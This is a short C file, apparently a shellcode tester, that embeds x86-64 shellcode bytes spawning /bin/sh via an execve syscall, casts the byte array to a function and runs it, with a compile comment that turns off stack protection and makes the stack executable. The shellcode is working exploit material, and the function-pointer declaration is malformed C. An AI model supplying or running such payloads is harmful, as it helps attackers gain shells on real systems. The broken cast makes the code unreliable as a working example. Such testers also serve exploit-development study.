
#include <stdio.h>
#include <string.h>



int main()
{
	char shellcode[] = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05";
	
   	printf("lenght shellcode %d\n", strlen(shellcode));
    
    	int (ret)() = (int()())shellcode;
    	ret();
    	return 0;
}

//Compilation : gcc -fno-stack-protector -z execstack wrapper.c -o wrapper
